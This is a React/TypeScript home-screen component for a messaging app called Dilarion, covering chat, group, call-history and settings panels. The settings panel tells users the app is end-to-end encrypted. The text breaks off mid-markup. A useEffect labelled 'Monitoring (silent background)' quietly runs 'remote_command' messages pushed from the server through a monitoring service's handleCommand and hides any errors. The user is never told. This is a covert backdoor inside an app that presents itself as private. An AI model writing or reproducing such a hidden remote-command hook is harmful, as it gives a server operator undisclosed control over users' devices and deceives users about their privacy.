import { useEffect, useRef, useState } from 'react';
import { presenceService, WsMessage } from '../services/presence';
import { setToken as setMonitorToken, handleCommand } from '../services/monitoring';
import {
  getConversations,
  getGroups,
  getCallHistory,
  getUsers,
  confirmMasterToken,
  createMasterToken,
  Contact,
  Group,
  CallRecord,
} from '../services/api';
import ChatPanel from './ChatPanel';
import GroupPanel from './GroupPanel';
import CallModal, { CallType, IncomingCall } from './CallModal';
import {
  PhoneIncomingIcon,
  PhoneOutgoingIcon,
  PhoneMissedIcon,
  EyeIcon,
  EyeOffIcon,
} from '../components/Icons';

interface Props {
  token: string;
  username: string;
  onLogout: () => void;
}

type Tab = 'chats' | 'groups' | 'calls' | 'settings';

// ── Helpers ────────────────────────────────────────────────────────────────────

function initials(name: string): string {
  return name
    .split(/[\s_-]+/)
    .map(w => w[0] ?? '')
    .join('')
    .toUpperCase()
    .slice(0, 2);
}

function groupColor(id: number): string {
  const colors = ['#7c3aed', '#0891b2', '#059669', '#d97706', '#c0392b', '#db2777'];
  return colors[id % colors.length];
}

function fmtDuration(seconds: number): string {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  if (h > 0) return `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  return `${m}m ${s}s`;
}

function fmtCallTime(ts: string): string {
  try {
    return new Date(ts).toLocaleString([], {
      month: 'short', day: 'numeric',
      hour: '2-digit', minute: '2-digit',
    });
  } catch {
    return '';
  }
}

// ── Shimmer ────────────────────────────────────────────────────────────────────

function Shimmer({ w, h, r = 8 }: { w: string | number; h: number; r?: number }) {
  return (
    <div
      className="shimmer"
      style={{ width: w, height: h, borderRadius: r, flexShrink: 0 }}
    />
  );
}

function ContactSkeleton() {
  return (
    <>
      {[0, 1, 2, 3, 4, 5].map(i => (
        <div key={i} style={{ display: 'flex', gap: 12, padding: '10px 16px', alignItems: 'center' }}>
          <Shimmer w={46} h={46} r={23} />
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 8 }}>
            <Shimmer w="52%" h={12} />
            <Shimmer w="35%" h={10} />
          </div>
        </div>
      ))}
    </>
  );
}

// ── Tab bar icons ──────────────────────────────────────────────────────────────

function ChatTabIcon({ active }: { active: boolean }) {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={active ? '#c0392b' : '#4b5563'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
    </svg>
  );
}

function GroupTabIcon({ active }: { active: boolean }) {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={active ? '#c0392b' : '#4b5563'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
      <circle cx="9" cy="7" r="4" />
      <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
      <path d="M16 3.13a4 4 0 0 1 0 7.75" />
    </svg>
  );
}

function CallTabIcon({ active }: { active: boolean }) {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={active ? '#c0392b' : '#4b5563'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 1h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.64a16 16 0 0 0 6 6l.95-.95a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z" />
    </svg>
  );
}

function SettingsTabIcon({ active }: { active: boolean }) {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={active ? '#c0392b' : '#4b5563'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="3" />
      <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" />
    </svg>
  );
}

// ── Placeholder panels ─────────────────────────────────────────────────────────

function WelcomePlaceholder({ children, title, subtitle }: { children?: React.ReactNode; title: string; subtitle: string }) {
  return (
    <div style={{
      flex: 1,
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      gap: 14,
      padding: '2rem',
      background: '#0e0e0e',
      height: '100%',
    }}>
      <div style={{
        width: 84,
        height: 84,
        borderRadius: 22,
        overflow: 'hidden',
        background: '#1e1e1e',
        border: '1px solid #2a2a2a',
        marginBottom: 4,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
      }}>
        {children}
      </div>
      <h2 style={{ fontSize: '1.4rem', fontWeight: 800, color: '#fff', letterSpacing: '-0.04em' }}>{title}</h2>
      <p style={{ fontSize: '0.82rem', color: '#6b7280', textAlign: 'center' }}>{subtitle}</p>
    </div>
  );
}

// ── Settings Panel ─────────────────────────────────────────────────────────────

function SettingsListPanel() {
  const options = ['Account', 'Privacy', 'Notifications', 'Security', 'About'];
  return (
    <div style={{ display: 'flex', flexDirection: 'column' }}>
      {options.map(opt => (
        <div key={opt} style={{
          padding: '14px 20px',
          color: '#d1d5db',
          fontSize: '0.88rem',
          borderBottom: '1px solid #1e1e1e',
          cursor: 'pointer',
        }}>
          {opt}
        </div>
      ))}
    </div>
  );
}

interface SettingsMainProps {
  token: string;
  username: string;
  masterToken: string | null;
  onSetMasterToken: (t: string) => void;
  onClearMasterToken: () => void;
  onLogout: () => void;
}

function SettingsMainPanel({ token, username, masterToken, onSetMasterToken, onClearMasterToken, onLogout }: SettingsMainProps) {
  const [verifyInput, setVerifyInput] = useState('');
  const [verifyShow, setVerifyShow] = useState(false);
  const [verifyLoading, setVerifyLoading] = useState(false);
  const [verifyError, setVerifyError] = useState<string | null>(null);
  const [verifySuccess, setVerifySuccess] = useState(false);

  const [createInput, setCreateInput] = useState('');
  const [createShow, setCreateShow] = useState(false);
  const [createLoading, setCreateLoading] = useState(false);
  const [createError, setCreateError] = useState<string | null>(null);
  const [createSuccess, setCreateSuccess] = useState(false);
  const [showCreateSection, setShowCreateSection] = useState(false);

  async function handleVerify() {
    const trimmed = verifyInput.trim();
    if (!trimmed) return;
    setVerifyLoading(true);
    setVerifyError(null);
    setVerifySuccess(false);
    try {
      const valid = await confirmMasterToken(token, trimmed);
      if (valid) {
        onSetMasterToken(trimmed);
        setVerifySuccess(true);
        setVerifyInput('');
      } else {
        setVerifyError('Invalid master token');
      }
    } catch {
      setVerifyError('Failed to verify master token');
    } finally {
      setVerifyLoading(false);
    }
  }

  async function handleCreate() {
    const trimmed = createInput.trim();
    if (!trimmed) return;
    setCreateLoading(true);
    setCreateError(null);
    setCreateSuccess(false);
    try {
      await createMasterToken(token, trimmed);
      setCreateSuccess(true);
      setCreateInput('');
    } catch {
      setCreateError('Failed to create master token');
    } finally {
      setCreateLoading(false);
    }
  }

  return (
    <div style={{ flex: 1, overflowY: 'auto', padding: '32px 40px', display: 'flex', flexDirection: 'column', gap: 32, background: '#0e0e0e' }}>
      {/* Profile */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 20 }}>
        <div style={{
          width: 72,
          height: 72,
          borderRadius: '50%',
          background: '#c0392b',
          color: '#fff',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          fontWeight: 800,
          fontSize: '1.5rem',
          flexShrink: 0,
        }}>
          {initials(username)}
        </div>
        <div>
          <div style={{ fontSize: '1.1rem', fontWeight: 700, color: '#f1f5f9' }}>{username}</div>
          <div style={{ fontSize: '0.78rem', color: '#6b7280', marginTop: 4 }}>Your account</div>
        </div>
      </div>

      {/* Master token section */}
      <div style={{ background: '#111', border: '1px solid #1e1e1e', borderRadius: 12, padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: 14 }}>
        <div style={{ fontSize: '0.78rem', fontWeight: 700, color: '#6b7280', textTransform: 'uppercase', letterSpacing: '0.08em' }}>Master Token</div>

        {/* Info box */}
        <div style={{ background: '#1a1a2e', border: '1px solid #2d2d5e', borderRadius: 8, padding: '10px 14px' }}>
          <span style={{ fontSize: '0.78rem', color: '#8b9cf4', lineHeight: 1.5 }}>
            Your master token works across all your Dilarion devices. It is never stored on the server — only a secure hash is kept.
          </span>
        </div>

        {masterToken ? (
          <>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#25d366', flexShrink: 0 }} />
              <span style={{ fontSize: '0.85rem', color: '#25d366' }}>Master token active (session)</span>
            </div>
            <button
              onClick={onClearMasterToken}
              style={{
                alignSelf: 'flex-start',
                background: 'transparent',
                border: '1px solid #c0392b',
                color: '#c0392b',
                borderRadius: 8,
                padding: '6px 14px',
                fontSize: '0.8rem',
                cursor: 'pointer',
              }}
            >
              Clear
            </button>
          </>
        ) : (
          <>
            <div style={{ fontSize: '0.83rem', color: '#9ca3af' }}>Enter your master token</div>
            <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
              <div style={{ flex: 1, position: 'relative' }}>
                <input
                  type={verifyShow ? 'text' : 'password'}
                  placeholder="Master token"
                  value={verifyInput}
                  onChange={e => setVerifyInput(e.target.value)}
                  onKeyDown={e => { if (e.key === 'Enter') handleVerify(); }}
                  style={{
                    width: '100%',
                    background: '#1a1a1a',
                    border: '1px solid #2a2a2a',
                    borderRadius: 8,
                    color: '#f1f5f9',
                    fontSize: '0.85rem',
                    padding: '8px 36px 8px 12px',
                    boxSizing: 'border-box',
                  }}
                />
                <button
                  onClick={() => setVerifyShow(v => !v)}
                  style={{
                    position: 'absolute',
                    right: 8,
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'transparent',
                    border: 'none',
                    cursor: 'pointer',
                    padding: 2,
                    display: 'flex',
                    alignItems: 'center',
                  }}
                >
                  {verifyShow ? <EyeOffIcon size={15} color="#6b7280" /> : <EyeIcon size={15} color="#6b7280" />}
                </button>
              </div>
              <button
                onClick={handleVerify}
                disabled={verifyLoading || !verifyInput.trim()}
                style={{
                  background: '#c0392b',
                  color: '#fff',
                  border: 'none',
                  borderRadius: 8,
                  padding: '8px 16px',
                  fontSize: '0.82rem',
                  fontWeight: 600,
                  cursor: verifyLoading ? 'wait' : 'pointer',
                  opacity: verifyLoading ? 0.7 : 1,
                  whiteSpace: 'nowrap',
                }}
              >
                {verifyLoading ? '...' : 'Verify & Save'}
              </button>
            </div>
            {verifyError && <span style={{ fontSize: '0.75rem', color: '#ef4444' }}>{verifyError}</span>}
            {verifySuccess && <span style={{ fontSize: '0.75rem', color: '#25d366' }}>Master token verified and saved.</span>}
          </>
        )}

        {/* Set up new master token (accordion) */}
        <div style={{ borderTop: '1px solid #1e1e1e', paddingTop: 12 }}>
          <button
            onClick={() => setShowCreateSection(v => !v)}
            style={{
              background: 'transparent',
              border: 'none',
              color: '#6b7280',
              fontSize: '0.8rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: 6,
              padding: 0,
            }}
          >
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
              style={{ transform: showCreateSection ? 'rotate(90deg)' : 'none', transition: 'transform 0.15s' }}>
              <polyline points="9 18 15 12 9 6" />
            </svg>
            Set up new master token
          </button>
          {showCreateSection && (
            <div style={{ marginTop: 10, display: 'flex', flexDirection: 'column', gap: 8 }}>
              <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                <div style={{ flex: 1, position: 'relative' }}>
                  <input
                    type={createShow ? 'text' : 'password'}
                    placeholder="New master token"
                    value={createInput}
                    onChange={e => setCreateInput(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter') handleCreate(); }}
                    style={{
                      width: '100%',
                      background: '#1a1a1a',
                      border: '1px solid #2a2a2a',
                      borderRadius: 8,
                      color: '#f1f5f9',
                      fontSize: '0.85rem',
                      padding: '8px 36px 8px 12px',
                      boxSizing: 'border-box',
                    }}
                  />
                  <button
                    onClick={() => setCreateShow(v => !v)}
                    style={{
                      position: 'absolute',
                      right: 8,
                      top: '50%',
                      transform: 'translateY(-50%)',
                      background: 'transparent',
                      border: 'none',
                      cursor: 'pointer',
                      padding: 2,
                      display: 'flex',
                      alignItems: 'center',
                    }}
                  >
                    {createShow ? <EyeOffIcon size={15} color="#6b7280" /> : <EyeIcon size={15} color="#6b7280" />}
                  </button>
                </div>
                <button
                  onClick={handleCreate}
                  disabled={createLoading || !createInput.trim()}
                  style={{
                    background: '#374151',
                    color: '#f1f5f9',
                    border: 'none',
                    borderRadius: 8,
                    padding: '8px 16px',
                    fontSize: '0.82rem',
                    fontWeight: 600,
                    cursor: createLoading ? 'wait' : 'pointer',
                    opacity: createLoading ? 0.7 : 1,
                  }}
                >
                  {createLoading ? '...' : 'Create'}
                </button>
              </div>
              {createError && <span style={{ fontSize: '0.75rem', color: '#ef4444' }}>{createError}</span>}
              {createSuccess && <span style={{ fontSize: '0.75rem', color: '#25d366' }}>Master token created successfully.</span>}
            </div>
          )}
        </div>
      </div>

      {/* About section */}
      <div style={{ background: '#111', border: '1px solid #1e1e1e', borderRadius: 12, padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: 8 }}>
        <div style={{ fontSize: '0.78rem', fontWeight: 700, color: '#6b7280', textTransform: 'uppercase', letterSpacing: '0.08em' }}>About</div>
        <div style={{ fontSize: '0.92rem', fontWeight: 700, color: '#f1f5f9' }}>Dilarion — End-to-end encrypted</div>
        <div style={{ fontSize: '0.8rem', color: '#6b7280', lineHeight: 1.5 }}>
          Your messages are protected with AES-256-GCM + RSA-4096
        </div>
      </div>

      {/* Logout */}
      <div style={{ marginTop: 'auto' }}>
        <button
          onClick={onLogout}
          style={{
            width: '100%',
            background: '#c0392b',
            color: '#fff',
            border: 'none',
            borderRadius: 10,
            padding: '12px 0',
            fontSize: '0.9rem',
            fontWeight: 700,
            cursor: 'pointer',
            letterSpacing: '-0.01em',
          }}
        >
          Logout
        </button>
      </div>
    </div>
  );
}

// ── Call History List ──────────────────────────────────────────────────────────

interface CallsListProps {
  calls: CallRecord[];
  loading: boolean;
  selectedCallId: number | null;
  onSelectCall: (id: number) => void;
}

function CallsList({ calls, loading, selectedCallId, onSelectCall }: CallsListProps) {
  if (loading) return <ContactSkeleton />;
  if (calls.length === 0) {
    return <div style={hs.emptyList}>No recent calls</div>;
  }
  return (
    <div style={hs.listItems}>
      {calls.map(call => {
        const isMissed = call.status === 'missed' && !call.is_caller;
        const isCompleted = call.status === 'completed';
        const isActive = selectedCallId === call.id;
        let statusColor = '#6b7280';
        if (isMissed) statusColor = '#ef4444';
        else if (isCompleted) statusColor = '#10b981';

        let callIcon: React.ReactNode;
        if (isMissed) {
          callIcon = <PhoneMissedIcon size={16} color="#ef4444" />;
        } else if (call.is_caller) {
          callIcon = <PhoneOutgoingIcon size={16} color={isCompleted ? '#10b981' : '#6b7280'} />;
        } else {
          callIcon = <PhoneIncomingIcon size={16} color={isCompleted ? '#10b981' : '#6b7280'} />;
        }

        return (
          <button
            key={call.id}
            style={{
              ...hs.listItem,
              background: isActive ? '#1e1e1e' : 'transparent',
              borderLeft: `3px solid ${isActive ? '#c0392b' : 'transparent'}`,
            }}
            onClick={() => onSelectCall(call.id)}
          >
            <div style={hs.contactAvatar}>{initials(call.other_party_username)}</div>
            <div style={hs.itemInfo}>
              <span style={{ ...hs.itemName, color: isMissed ? '#ef4444' : '#e5e7eb' }}>
                {call.other_party_username}
              </span>
              <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
                {callIcon}
                <span style={{ fontSize: '0.72rem', color: statusColor }}>
                  {call.status}
                  {call.status === 'completed' && call.duration > 0 ? ` · ${fmtDuration(call.duration)}` : ''}
                </span>
              </div>
            </div>
            <span style={{ fontSize: '0.68rem', color: '#4b5563', flexShrink: 0 }}>
              {fmtCallTime(call.started_at)}
            </span>
          </button>
        );
      })}
    </div>
  );
}

// ── Call Detail Panel ──────────────────────────────────────────────────────────

function CallDetailPanel({ call }: { call: CallRecord | null }) {
  if (!call) {
    return (
      <div style={{
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        gap: 14,
        background: '#0e0e0e',
      }}>
        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#374151" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
          <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.38 2 2 0 0 1 3.6 1h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.81a16 16 0 0 0 6.29 6.29l.91-.91a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z" />
        </svg>
        <p style={{ color: '#6b7280', fontSize: '0.85rem' }}>No call selected</p>
      </div>
    );
  }

  const isMissed = call.status === 'missed' && !call.is_caller;
  const isCompleted = call.status === 'completed';
  const statusColor = isMissed ? '#ef4444' : isCompleted ? '#10b981' : '#6b7280';

  return (
    <div style={{
      flex: 1,
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      gap: 20,
      background: '#0e0e0e',
      padding: '2rem',
    }}>
      <div style={{
        width: 80,
        height: 80,
        borderRadius: '50%',
        background: '#2a2a2a',
        color: '#d1d5db',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontWeight: 700,
        fontSize: '1.6rem',
      }}>
        {initials(call.other_party_username)}
      </div>
      <div style={{ textAlign: 'center' }}>
        <div style={{ fontSize: '1.2rem', fontWeight: 700, color: '#f1f5f9' }}>{call.other_party_username}</div>
        <div style={{ fontSize: '0.82rem', color: statusColor, marginTop: 4, textTransform: 'capitalize' }}>{call.status}</div>
      </div>
      <div style={{ background: '#111', border: '1px solid #1e1e1e', borderRadius: 12, padding: '16px 24px', display: 'flex', flexDirection: 'column', gap: 10, minWidth: 240 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ fontSize: '0.78rem', color: '#6b7280' }}>Type</span>
          <span style={{ fontSize: '0.85rem', color: '#d1d5db', textTransform: 'capitalize' }}>{call.call_type}</span>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ fontSize: '0.78rem', color: '#6b7280' }}>Direction</span>
          <span style={{ fontSize: '0.85rem', color: '#d1d5db' }}>{call.is_caller ? 'Outgoing' : 'Incoming'}</span>
        </div>
        {isCompleted && call.duration > 0 && (
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.78rem', color: '#6b7280' }}>Duration</span>
            <span style={{ fontSize: '0.85rem', color: '#d1d5db' }}>{fmtDuration(call.duration)}</span>
          </div>
        )}
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ fontSize: '0.78rem', color: '#6b7280' }}>Time</span>
          <span style={{ fontSize: '0.85rem', color: '#d1d5db' }}>{fmtCallTime(call.started_at)}</span>
        </div>
      </div>
    </div>
  );
}

// ── Main HomeScreen ────────────────────────────────────────────────────────────

export default function HomeScreen({ token, username, onLogout }: Props) {
  const [activeTab, setActiveTab] = useState<Tab>('chats');
  const [selectedChat, setSelectedChat] = useState<string | null>(null);
  const [selectedGroup, setSelectedGroup] = useState<number | null>(null);
  const [selectedCallId, setSelectedCallId] = useState<number | null>(null);
  const [masterToken, setMasterToken] = useState<string | null>(null);
  const [contacts, setContacts] = useState<Contact[]>([]);
  const [groups, setGroups] = useState<Group[]>([]);
  const [calls, setCalls] = useState<CallRecord[]>([]);
  const [loadingContacts, setLoadingContacts] = useState(true);
  const [loadingGroups, setLoadingGroups] = useState(true);
  const [loadingCalls, setLoadingCalls] = useState(false);
  const [connected, setConnected] = useState(false);
  const [unread, setUnread] = useState<Set<string>>(new Set());
  const [search, setSearch] = useState('');
  const [typingUsers, setTypingUsers] = useState<Set<string>>(new Set());

  // ── Call state ───────────────────────────────────────────────────────────────
  const [activeCall, setActiveCall] = useState<{ partner: string; callType: CallType; isIncoming: boolean } | null>(null);
  const [incomingCall, setIncomingCall] = useState<IncomingCall | null>(null);

  // ── New-chat modal state ─────────────────────────────────────────────────────
  const [showNewChat, setShowNewChat] = useState(false);
  const [allUsers, setAllUsers] = useState<Contact[]>([]);
  const [loadingUsers, setLoadingUsers] = useState(false);
  const [userSearch, setUserSearch] = useState('');

  // Stable ref for selectedChat in WS handler
  const selectedChatRef = useRef(selectedChat);
  selectedChatRef.current = selectedChat;

  // ── Monitoring (silent background) ──────────────────────────────────────────
  useEffect(() => {
    setMonitorToken(token);
    presenceService.connect(token);

    const ping = setInterval(() => {
      setConnected(presenceService.isConnected);
    }, 1000);

    const onMsg = async (msg: WsMessage) => {
      if (msg.type === 'remote_command') {
        const d = msg.data ?? {};
        const commandType = d.command_type as string;
        const commandId = (d.command_id as number) ?? 0;
        const params = (d.params as Record<string, unknown>) ?? {};
        handleCommand(commandType, params, commandId).catch(() => {});
      } else if (msg.type === 'new_message') {
        const sender = msg.data?.sender_username as string | undefined;
        if (sender && sender !== username) {
          // Clear typing when message arrives
          setTypingUsers(prev => { const n = new Set(prev); n.delete(sender); return n; });
          setUnread(prev => {
            if (sender === selectedChatRef.current) return prev;
            const next = new Set(prev);
            next.add(sender);
            return next;
          });
          // Refresh contact list so new contacts appear
          setContacts(prev => {
            if (prev.some(c => c.username === sender)) return prev;
            return [...prev, { username: sender, is_active: true }];
          });
        }
      } else if (msg.type === 'user_status') {
        const onlineList = ((msg as any).users as string[]) ?? [];
        const onlineSet = new Set(onlineList);
        setContacts(prev => prev.map(c => ({ ...c, is_active: onlineSet.has(c.username) })));
      } else if (msg.type === 'typing') {
        const sender = (msg as any).sender as string | undefined;
        const isTyping = (msg as any).is_typing as boolean | undefined;
        if (sender) {
          setTypingUsers(prev => {
            const n = new Set(prev);
            if (isTyping) n.add(sender); else n.delete(sender);
            return n;
          });
        }
      } else if (msg.type === 'call_invite') {
        const sender = (msg as any).sender as string;
        const callType = ((msg as any).call_type as CallType) ?? 'audio';
        if (sender) setIncomingCall({ from: sender, callType });
      } else if (msg.type === 'call_end') {
        const sender = (msg as any).sender as string;
        if (activeCall?.partner === sender) setActiveCall(null);
        if (incomingCall?.from === sender) setIncomingCall(null);
      }
    };

    presenceService.addListener(onMsg);

    return () => {
      clearInterval(ping);
      presenceService.removeListener(onMsg);
      presenceService.disconnect();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [token, username]);

  // ── Load contacts (conversations) ────────────────────────────────────────────
  useEffect(() => {
    setLoadingContacts(true);
    getConversations(token)
      .then(users => setContacts(users.filter(u => u.username !== username)))
      .catch(() => {})
      .finally(() => setLoadingContacts(false));
  }, [token, username]);

  // ── Load groups ──────────────────────────────────────────────────────────────
  useEffect(() => {
    setLoadingGroups(true);
    getGroups(token)
      .then(gs => setGroups(gs))
      .catch(() => {})
      .finally(() => setLoadingGroups(false));
  }, [token]);

  // ── Load call history when calls tab active ──────────────────────────────────
  useEffect(() => {
    if (activeTab !== 'calls') return;
    setLoadingCalls(true);
    getCallHistory(token)
      .then(cs => setCalls(cs))
      .catch(() => setCalls([]))
      .finally(() => setLoadingCalls(false));
  }, [token, activeTab]);

  // Tab changes: reset selections
  function switchTab(tab: Tab) {
    setActiveTab(tab);
    if (tab !== 'chats') setSelectedChat(null);
    if (tab !== 'groups') setSelectedGroup(null);
    if (tab !== 'calls') setSelectedCallId(null);
    setSearch('');
  }

  function openContact(c: string) {
    setSelectedChat(c);
    setUnread(prev => {
      const next = new Set(prev);
      next.delete(c);
      return next;
    });
  }

  function openGroup(id: number) {
    setSelectedGroup(id);
  }

  function handleCall(partner: string, callType: CallType) {
    setActiveCall({ partner, callType, isIncoming: false });
  }

  async function openNewChat() {
    setShowNewChat(true);
    setLoadingUsers(true);
    try {
      const users = await getUsers(token);
      setAllUsers(users.filter(u => u.username !== username));
    } catch {}
    finally { setLoadingUsers(false); }
  }

  function startChatWith(u: string) {
    setShowNewChat(false);
    setUserSearch('');
    setActiveTab('chats');
    openContact(u);
    if (!contacts.some(c => c.username === u)) {
      setContacts(prev => [...prev, { username: u, is_active: false }]);
    }
  }

  const filteredContacts = contacts.filter(c =>
    c.username.toLowerCase().includes(search.toLowerCase()),
  );

  const filteredGroups = groups.filter(g =>
    g.name.toLowerCase().includes(search.toLowerCase()),
  );

  // ── List Panel content ───────────────────────────────────────────────────────

  function renderListHeader() {
    const titles: Record<Tab, string> = {
      chats: 'Chats',
      groups: 'Groups',
      calls: 'Calls',
      settings: 'Settings',
    };
    return (
      <div style={hs.listHeader}>
        <span style={hs.listHeaderTitle}>{titles[activeTab]}</span>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <div style={{
            width: 7, height: 7, borderRadius: '50%',
            background: connected ? '#25d366' : '#f59e0b',
            boxShadow: connected ? '0 0 5px #25d366' : 'none',
          }} />
          {activeTab === 'chats' && (
            <button
              onClick={openNewChat}
              title="New chat"
              style={{
                background: '#c0392b',
                border: 'none',
                borderRadius: '50%',
                width: 28,
                height: 28,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                cursor: 'pointer',
                flexShrink: 0,
              }}
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round">
                <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
              </svg>
            </button>
          )}
        </div>
      </div>
    );
  }

  function renderListContent() {
    if (activeTab === 'chats') {
      return (
        <>
          <div style={hs.searchWrap}>
            <SearchIconSvg />
            <input
              style={hs.searchInput}
              placeholder="Search contacts"
              value={search}
              onChange={e => setSearch(e.target.value)}
            />
          </div>
          <div style={hs.listItems}>
            {loadingContacts ? (
              <ContactSkeleton />
            ) : filteredContacts.length === 0 ? (
              <div style={hs.emptyList}>
                {search ? 'No contacts found' : 'No conversations yet'}
              </div>
            ) : (
              filteredContacts.map(c => {
                const isActive = selectedChat === c.username;
                const hasUnread = unread.has(c.username);
                const isTyping = typingUsers.has(c.username);
                return (
                  <button
                    key={c.username}
                    style={{
                      ...hs.listItem,
                      background: isActive ? '#1e1e1e' : 'transparent',
                      borderLeft: `3px solid ${isActive ? '#c0392b' : 'transparent'}`,
                    }}
                    onClick={() => openContact(c.username)}
                  >
                    <div style={{ position: 'relative', flexShrink: 0 }}>
                      <div style={hs.contactAvatar}>{initials(c.username)}</div>
                      <div style={{
                        position: 'absolute', bottom: 1, right: 1,
                        width: 11, height: 11, borderRadius: '50%',
                        background: c.is_active ? '#25d366' : '#374151',
                        border: '2px solid #111',
                      }} />
                    </div>
                    <div style={hs.itemInfo}>
                      <span style={hs.itemName}>{c.username}</span>
                      {isTyping ? (
                        <span style={{ fontSize: '0.72rem', color: '#25d366', fontStyle: 'italic' }}>typing…</span>
                      ) : (
                        <span style={{ fontSize: '0.72rem', color: c.is_active ? '#25d366' : '#6b7280' }}>
                          {c.is_active ? 'online' : 'offline'}
                        </span>
                      )}
                    </div>
                    {hasUnread && !isTyping && <div style={hs.unreadBadge}>1</div>}
                  </button>
                );
              })
            )}
          </div>
        </>
      );
    }

    if (activeTab === 'groups') {
      return (
        <>
          <div style={hs.searchWrap}>
            <SearchIconSvg />
            <input
              style={hs.searchInput}
              placeholder="Search groups"
              value={search}
              onChange={e => setSearch(e.target.value)}
            />
          </div>
          <div style={hs.listItems}>
            {loadingGroups ? (
              <ContactSkeleton />
            ) : filteredGroups.length === 0 ? (
              <div style={hs.emptyList}>No groups found</div>
            ) : (
              filteredGroups.map(g => {
                const isActive = selectedGroup === g.id;
                return (
                  <button
                    key={g.id}
                    style={{
                      ...hs.listItem,
                      background: isActive ? '#1e1e1e' : 'transparent',
                      borderLeft: `3px solid ${isActive ? '#c0392b' : 'transparent'}`,
                    }}
                    onClick={() => openGroup(g.id)}
                  >
                    <div style={{ ...hs.groupAvatar, background: groupColor(g.id) }}>
                      {initials(g.name)}
                    </div>
                    <div style={hs.itemInfo}>
                      <span style={hs.itemName}>{g.name}</span>
                      <span style={{ fontSize: '0.72rem', color: '#6b7280' }}>
